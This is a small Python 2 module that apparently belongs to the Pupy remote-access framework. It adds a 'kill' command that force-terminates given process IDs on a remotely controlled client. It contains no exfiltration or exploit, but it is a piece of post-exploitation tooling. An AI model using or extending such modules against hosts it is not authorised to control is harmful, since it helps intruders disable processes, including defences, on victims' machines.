# -*- coding: utf-8 -*-
from pupylib.PupyModule import *

__class_name__="KillModule"

@config(cat="general")
class KillModule(PupyModule):
    """ kill a process """

    def init_argparse(self):
        self.arg_parser = PupyArgumentParser(prog="kill", description=self.__doc__)
        self.arg_parser.add_argument('pids', type=int, nargs='+', help='pids to kill')

    def run(self, args):
        kill = self.client.remote('os', 'kill', False)

        for pid in args.pids:
            try:
                kill(pid,9)
                self.success('Killed: {}'.format(pid))

            except Exception, e:
                self.error('Failed: {}: {}'.format(pid, e))
